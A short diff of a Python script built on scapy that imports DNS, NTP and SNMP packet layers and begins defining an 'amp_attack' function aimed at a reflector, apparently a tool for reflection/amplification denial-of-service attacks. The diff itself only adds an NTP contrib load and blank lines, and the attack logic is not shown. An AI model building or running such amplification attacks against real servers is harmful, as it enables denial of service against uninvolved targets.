@@ -1,9 +1,12 @@
 import scapy.all as scapy
+scapy.load_contrib('ntp')
 from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import IP, UDP
 from scapy.contrib.ntp import NTP
 from scapy.contrib.snmp import SNMP, SNMPget, SNMPvarbind
 import time
+
+
 
 def amp_attack(reflector, service="DNS"):
     sport = scapy.RandShort()
